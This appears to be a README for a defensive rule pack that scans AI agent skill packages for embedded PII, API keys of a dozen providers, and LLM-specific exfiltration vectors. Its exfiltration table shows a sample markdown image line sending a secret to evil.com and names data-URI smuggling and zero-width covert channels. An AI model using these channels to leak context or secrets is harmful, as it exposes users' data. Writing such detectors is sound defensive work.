# PromptGuard Data Protection Rule Pack

**Source:** [PromptGuard](https://github.com/promptguard/promptguard)
**Version:** 1.0.0
**Rules:** 26 signatures across 3 signature files

## Overview

This pack adds data protection detection rules from the open-source PromptGuard project that are **not covered** by Cisco's built-in skill scanner ruleset or the ATR community pack. The rules target three categories with zero or minimal existing coverage.

## Gap Analysis

| Category | Core pack | ATR pack | This pack |
|----------|-----------|----------|-----------|
| PII detection | 0 rules | 0 rules | **8 rules** |
| Secret providers | 8 providers | 0 | **12 providers** |
| LLM-context exfiltration | Python/JS network calls | 1 (disguised analytics) | **6 rules** |

## Attack Categories

### 1. PII Detection (`pii_detection.yaml` — 8 rules)

Neither Cisco's core pack nor the ATR pack detect PII in skill packages. Skills containing real SSNs, credit card numbers, or instructions to harvest PII from users represent serious data protection risks.

| Rule ID | Severity | Description |
|---------|----------|-------------|
| PG_PII_SSN | CRITICAL | US Social Security Number embedded in skill files |
| PG_PII_CREDIT_CARD | CRITICAL | Credit card number (Visa, MC, Amex, Discover) |
| PG_PII_IBAN | HIGH | International Bank Account Number |
| PG_PII_PHONE_HARVESTING | HIGH | Instructions to collect phone numbers from users |
| PG_PII_SSN_HARVESTING | CRITICAL | Instructions to collect SSNs/national IDs |
| PG_PII_CARD_HARVESTING | CRITICAL | Instructions to collect credit card details |
| PG_PII_CREDENTIAL_HARVESTING | CRITICAL | Instructions to collect passwords/credentials |
| PG_PII_MEDICAL_ID | HIGH | Medicare Beneficiary Identifier (HIPAA PHI) |

### 2. Extended Secret Providers (`secret_providers.yaml` — 12 rules)

Cisco's core pack detects 8 secret providers (AWS, Stripe, Google, GitHub, JWT, private keys, passwords, connection strings). This pack adds 12 providers common in AI/agent deployments that are not covered.

| Rule ID | Severity | Description |
|---------|----------|-------------|
| PG_SECRET_OPENAI_KEY | CRITICAL | OpenAI API key (sk-..., sk-proj-...) |
| PG_SECRET_ANTHROPIC_KEY | CRITICAL | Anthropic API key (sk-ant-...) |
| PG_SECRET_SLACK_TOKEN | CRITICAL | Slack bot/user/app token |
| PG_SECRET_SLACK_WEBHOOK | HIGH | Slack incoming webhook URL |
| PG_SECRET_HUGGINGFACE_TOKEN | HIGH | Hugging Face access token (hf_...) |
| PG_SECRET_TWILIO_KEY | HIGH | Twilio API key or auth token |
| PG_SECRET_SENDGRID_KEY | HIGH | SendGrid API key (SG....) |
| PG_SECRET_NPM_TOKEN | CRITICAL | npm access token (supply chain risk) |
| PG_SECRET_PYPI_TOKEN | CRITICAL | PyPI API token (supply chain risk) |
| PG_SECRET_DISCORD_TOKEN | CRITICAL | Discord bot token |
| PG_SECRET_AZURE_KEY | CRITICAL | Azure Cognitive Services / Azure OpenAI key |
| PG_SECRET_DIGITALOCEAN_TOKEN | CRITICAL | DigitalOcean personal access token |

### 3. LLM-Context Exfiltration (`markdown_exfiltration.yaml` — 6 rules)

Cisco's core pack detects exfiltration via Python/JS network calls. These rules detect LLM-specific exfiltration vectors that exploit the agent's ability to render markdown, construct URLs, or encode data — techniques invisible to network-level detection.

| Rule ID | Severity | Description |
|---------|----------|-------------|
| PG_EXFIL_MARKDOWN_IMAGE | CRITICAL | `![](https://evil.com?d=SECRET)` — image URL with stolen data |
| PG_EXFIL_MARKDOWN_LINK | HIGH | Markdown link smuggling data in constructed URLs |
| PG_EXFIL_HTML_TAG | HIGH | HTML `<img>/<script>` injection with dynamic URLs |
| PG_EXFIL_DATA_URI | HIGH | `data:text/html;base64,...` executable payload smuggling |
| PG_EXFIL_URL_ENCODING | HIGH | Instructions to encode secrets/context into URL parameters |
| PG_EXFIL_INVISIBLE_PAYLOAD | CRITICAL | Zero-width character steganography for covert data channels |

## File Structure

```
skill_scanner/data/packs/promptguard/
├── pack.yaml                              # Pack manifest with all 26 rule entries
├── README.md                              # This file
└── signatures/
    ├── pii_detection.yaml                 # 8 PII detection rules
    ├── secret_providers.yaml              # 12 secret provider rules
    └── markdown_exfiltration.yaml         # 6 LLM-context exfiltration rules
```

## Design Principles

- **Zero overlap** — Every rule detects something the core pack and ATR pack do not.
- **Data-only** — No Python code, no existing file modifications.
- **High precision** — Patterns use strict formats with exclude lists to minimize false positives.
- **Agent-relevant** — PII harvesting and markdown exfil rules target threats specific to AI agent skill packages, not generic static analysis.

## PromptGuard Project Links

- Repository: https://github.com/promptguard/promptguard
- Documentation: https://docs.promptguard.co
- License: Apache-2.0
